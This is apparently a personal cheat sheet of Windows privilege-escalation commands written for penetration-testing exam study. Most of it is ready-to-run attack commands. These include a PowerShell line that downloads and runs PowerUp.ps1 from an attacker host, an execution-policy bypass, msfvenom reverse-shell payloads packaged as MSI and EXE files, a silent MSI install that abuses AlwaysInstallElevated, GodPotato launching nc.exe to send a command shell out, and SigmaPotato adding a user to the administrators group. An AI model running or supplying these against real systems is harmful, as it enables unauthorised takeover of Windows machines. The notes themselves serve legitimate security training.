# Windows PrivEsc 

### Both AD and Windows PrivEsc go together 

## Manual look up

```
whoami /priv
whoami /groups
systeminfo
net user
net localgroup administrators
Get-ScheduledTask --> check to see if you can abuse a schedule task
```
## PowerUp commands
One way to share it, in PowerShell:
```
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
```
```
powershell -ep bypass
```
Or:
```
powershell -ExecutionPolicy Bypass
```
Then run:
```
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```
Then put your focus here:
```
Service Misconfigurations
AlwaysInstallElevated
Modifiable Services
Modifiable Service Binaries
Unquoted Service Paths
Credential Files
Writable Registry Keys
```


## Always Elevated

If powerup shows up:

```
AlwaysInstallElevated: Enabled
```
Then we can make a msi exploit for it:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > shell.msi
```
Then run the msi after sharing it:

```
msiexec /quiet /qn /i shell.msi
```

## Low Hanging Fruit 

If you see Impersonate with whoami /priv, stick with sigma and god potato:
<img width="720" height="352" alt="image" src="https://github.com/user-attachments/assets/db7a42ef-0fb8-4808-8924-c0811265ec4c" />

Share the file, along with nc.exe and then run these for god potato:
```
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```
```
.\GodPotato-NET4.exe -cmd "C:\Users\user\Desktop\nc.exe <TP> 4444 -e cmd.exe"
```

For Sigma potato:
```
.\sp.exe "net localgroup administrators user /add"
```

## PATH Hijack
PowerUp may show with write permissions to the PATH directory

Like:
```
Backup.exe
```
Check with accesschk.exe/icals 

replace it with your own:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe > backup.exe
```
Then, after sharing it, run it, and check the shell.

## Links

I go over a lot more tactics here in this blog post:
https://medium.com/@aaronashley466/oscp-notes-windows-privesc-cheatsheet-1c71a792f545?postPublishedType=repub
